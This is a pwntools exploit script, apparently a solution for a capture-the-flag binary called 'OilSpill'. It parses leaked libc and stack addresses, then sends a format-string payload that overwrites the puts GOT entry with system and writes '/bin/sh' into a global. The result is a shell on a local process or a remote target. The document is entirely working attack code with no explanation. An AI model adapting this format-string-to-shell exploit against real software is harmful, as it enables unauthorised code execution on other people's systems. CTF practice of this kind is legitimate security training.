from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x0000000000400724
continue
'''.format(**locals())

exe = './challenge/OilSpill'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

ret = 0x0000000000400536
pop3 = 0x00000000004007de
pop_rdi_ret = 0x00000000004007e3
pop4 = 0x00000000004007dc

p = start(); out = p.recvline().split(b', ')

puts = int(out[0], 16)
stack = int(out[2], 16)

info("Leak puts: " + hex(puts))
info("Leak stack: " + hex(stack))

libc.address = puts - libc.sym.puts

payload = fmtstr_payload(8, {elf.got.puts : libc.sym.system, elf.sym.x:b'/bin/sh\x00'}, write_size='short')
p.sendlineafter(b'?', payload)

p.interactive()
